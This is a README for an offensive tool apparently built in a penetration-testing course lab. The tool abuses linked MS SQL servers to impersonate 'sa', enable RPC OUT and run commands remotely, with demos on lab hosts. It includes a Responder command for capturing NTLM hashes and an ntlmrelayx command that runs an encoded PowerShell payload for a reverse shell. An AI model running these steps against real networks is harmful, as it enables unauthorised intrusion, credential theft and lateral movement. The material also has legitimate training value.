# SQLinks2Move

## Presentation

SQLinks2Move is a tool created during OSEP PEN-300 lab. This tool is used to link SQL servers and perform Lateral Movement against them.

## What it does exactly?

It depends, which value you entered into it. Basically, once you specify all the values it will do the following :

1. It authenticate on your actual given SQL Server name, connect to it and to the database.
2. It will login as the current user.
3. It will mapp the user.
4. It will check if your current user is a member of public role. Then check if its a member of sysadmin role.
5. It will link the database if possible.
6. It will check if there is an impersonable login by two different way.
7. If specified, it will try to perform NTLM relay hash, you should setup responder or impacket-ntlmrelayx before using it.
8. It will check if RPC OUT is enabled.
9. It will try to enable RPC OUT is it is disabled.
10. It will impersonate the given username (if there is impersonable user)
11. It will execute on specified remote linked SQL server the given command.

To a full understanding, refere to the code.

An analyse of the code is planned to be created to get a better documentation.

## Usage

1. First load the SQLinks2Move folder inside Visual Studio and compile the code as Release.

2. Then upload SQLinks2Move.exe to the target SQL Server that you already own.

3. Execute SQLinks2Move.exe 

4. Specify your values when prompted.

## Demo - Basic Usage

For legal reason, i have hidden sensitive informations on the pictures. So i will give randome informations to lead you througt this demo.

### Step 1 - Basic usage.

First running whoami, we see that we are ```PANDA\sqlsvc```. Running hostname told us that we are on the domaine machine name ```KOALA01```.

Running SQLinks2Move binary, specifying servername ```KOALA01``` database ```master``` and leaving blank all others value except RPC where we choose "N" return this result.

![step 1](https://user-images.githubusercontent.com/22322762/120856435-2b6d4800-c580-11eb-8599-5f8dc86e6826.png)

We can see that the auth is a success, we are mapped as ```dbo``` we are member of public and sysadmin role. We linked two SQL Server which are ```KOALA01\SQLEXPRESS``` and ```PIZZA03```. The login ```sa``` can be impersonated.

### Step 2 - Command Execution on PIZZA03

Re-running SQLinks2Move.exe but this time specifying the user to impersonate ```sa```, executing the command ```hostname``` against the server ```PIZZA03```, checking if RPC is enabled, and allow to enable it.

![step 2](https://user-images.githubusercontent.com/22322762/120855557-f14f7680-c57e-11eb-9d30-ab29be314e08.png)

We see that we impersonated ```sa``` with sucess, that RPC OUT was disabled (Because of "False" answer), we enabled it, executed ```hostname``` as ```sa``` against ```PIZZA03``` return the result of command ```PIZZA03```

We can do command execution, so for example, using web_delivery metasploit module using powershell payload, we should be able to retrieve a shell on ```PIZZA03```

## Demo - NTLM Hashes.

By setting up responder with ```sudo responder -I [interface]```, and specifying your LHOST when prompted by SQLinks2Move.exe, we can retreive NTLM hash and attempt to crack it.

![step 3](https://user-images.githubusercontent.com/22322762/120856039-83f01580-c57f-11eb-97ea-9fff9da2ddb4.png)

Alternatively we can setup impacket-ntlmrelayx and execute a command to get a reverse shell if the target is vulnerable.

For example using :

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t [PIZZA03_ip_address] -c 'powershell -enc <base64>'
```

TODO : Screenshot of impacket-ntlmrelayx







